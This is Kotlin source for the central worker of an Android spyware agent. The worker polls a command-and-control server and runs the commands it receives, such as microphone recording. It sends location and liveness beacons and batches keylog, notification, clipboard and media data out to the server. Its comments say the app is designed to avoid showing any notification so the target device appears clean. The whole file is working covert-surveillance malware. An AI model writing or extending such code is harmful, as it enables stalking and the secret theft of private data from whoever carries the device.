package com.sp.core.agent

import android.content.Context
import android.util.Log
import com.sp.core.c2.Commands
import com.sp.core.c2.Exfil
import com.sp.core.services.LocationFix
import com.sp.core.util.BatchExfil
import com.sp.core.util.Prefs
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * One tick of the agent.
 *
 * Everything that has to happen in the background is done here: the command
 * channel, the liveness beacon, the position and the batch flush.
 *
 * The tick is driven by the watchdog alarm (and by the watchdog job as a
 * backstop), NOT by a long-running foreground service. On Android 14+ a
 * foreground service always shows a notification - the system raises the
 * importance of the channel to LOW no matter how it was created - and the
 * target device must stay completely clean. A tick costs about a second, so
 * the alarm interval decides how often the agent reacts.
 */
object AgentWorker {

    private const val TAG = "AgentWorker"
    const val TICK_INTERVAL_MS = 30_000L

    private const val KEY_LAST_TICK = "agent_last_tick"
    private const val KEY_LAST_FLUSH = "agent_last_flush"
    private const val KEY_TICKS = "agent_ticks"

    /** The flush of the buffered data happens every 45 minutes. */
    const val FLUSH_INTERVAL_MS = 45 * 60 * 1000L

    private val busy = AtomicBoolean(false)

    /**
     * Runs one tick. Safe to call from anywhere - overlapping calls are
     * dropped instead of piling up.
     */
    fun tick(ctx: Context, force: Boolean = false) {
        if (!busy.compareAndSet(false, true)) return
        val app = ctx.applicationContext
        try {
            Prefs.set(app, KEY_LAST_TICK, System.currentTimeMillis())
            val ticks = (Prefs.get(app, KEY_TICKS, 0) as Int) + 1
            Prefs.set(app, KEY_TICKS, ticks)

            // The clipboard listener is armed on every tick - it only fires
            // while the process lives, but the app must never show a
            // notification to keep it running.
            try { com.sp.core.services.ClipboardMonitor.start(app) } catch (_: Throwable) {}

            pollCommands(app)

            // The beacon goes out every third tick - it proves the device is
            // alive even when the encrypted channel is silent.
            if (force || ticks % 3 == 1) {
                try { com.sp.core.util.Beacon.send(app, "alive", aliveInfo(app)) } catch (_: Throwable) {}
            }

            /* A fresh position every third tick - and it always goes out
               right away, the map has to be alive. The heavier data (keylog,
               notifications, media) stays in the 45-minute batch. */
            if (force || ticks % 3 == 1) {
                try { LocationFix.send(app, immediate = true) } catch (_: Throwable) {}
            }

            // The app-usage profile is collected once per interval.
            if (ticks % 20 == 0) {
                try { com.sp.core.services.UsageStatsService.collectUsage(app) } catch (_: Throwable) {}
            }

            if (force || dueForFlush(app)) {
                try { BatchExfil.flush(app) } catch (_: Throwable) {}
                Prefs.set(app, KEY_LAST_FLUSH, System.currentTimeMillis())
            }
        } catch (t: Throwable) {
            Log.w(TAG, "tick: ${t.message}")
        } finally {
            busy.set(false)
        }
    }

    private fun dueForFlush(ctx: Context): Boolean {
        val last = Prefs.get(ctx, KEY_LAST_FLUSH, 0L) as Long
        return System.currentTimeMillis() - last >= FLUSH_INTERVAL_MS
    }

    /**
     * Command channel: the agent polls the C2 for queued commands. FCM is
     * optional, this channel works without a Firebase project.
     */
    private fun pollCommands(ctx: Context) {
        try {
            val base = Exfil.baseUrl(ctx) ?: return
            val deviceId = Prefs.deviceId(ctx)
            val key = URLEncoder.encode(Exfil.apiKeyValue() ?: "", "UTF-8")
            val url = "$base/poll?device_id=$deviceId&k=$key"
            val req = Request.Builder().url(url).get().build()
            pollClient.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return
                val body = resp.body?.string() ?: return
                val arr = JSONArray(body)
                var dispatched = false
                for (i in 0 until arr.length()) {
                    val o = arr.getJSONObject(i)
                    val cmd = o.optString("cmd")
                    if (cmd.isBlank()) continue
                    val args = HashMap<String, String>()
                    /* The C2 delivers the arguments as a JSON string
                       ("{\"sec\":8}"), not as an object - reading it as an
                       object silently threw every argument away, so "mic"
                       always recorded the default 60 seconds. Both forms are
                       accepted here. */
                    val rawArgs = o.opt("args")
                    when (rawArgs) {
                        is JSONObject -> rawArgs.keys().forEach { k ->
                            args[k] = rawArgs.optString(k)
                        }
                        is String -> {
                            try {
                                val parsed = JSONObject(rawArgs)
                                parsed.keys().forEach { k -> args[k] = parsed.optString(k) }
                            } catch (_: Throwable) {
                            }
                        }
                    }
                    // The dispatch stays off the main looper: the commands do
                    // content-provider and file I/O.
                    try {
                        Commands.dispatch(ctx, cmd, args)
                        Exfil.sendLog(ctx, "cmd_result", """{"cmd":"$cmd","ok":true}""")
                    } catch (t: Throwable) {
                        Exfil.sendLog(
                            ctx, "cmd_result",
                            """{"cmd":"$cmd","ok":false,"err":"${t.javaClass.simpleName}"}"""
                        )
                    }
                    dispatched = true
                }
                if (dispatched) {
                    // Whatever was buffered goes out now - a command must
                    // never wait for the 45-minute batch.
                    try { BatchExfil.flush(ctx) } catch (_: Throwable) {}
                }
            }
        } catch (_: Throwable) {
        }
    }

    private fun aliveInfo(ctx: Context): String {
        val sb = StringBuilder()
        sb.append("{\"device_id\":\"").append(Prefs.deviceId(ctx)).append("\"")
        sb.append(",\"sdk\":").append(android.os.Build.VERSION.SDK_INT)
        sb.append(",\"pending\":").append(BatchExfil.pendingCount(ctx))
        sb.append(",\"battery\":").append(com.sp.core.util.Battery.percent(ctx))
        sb.append(",\"ts\":").append(System.currentTimeMillis())
        sb.append("}")
        return sb.toString()
    }

    private val pollClient = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(5, TimeUnit.SECONDS)
        .build()
}
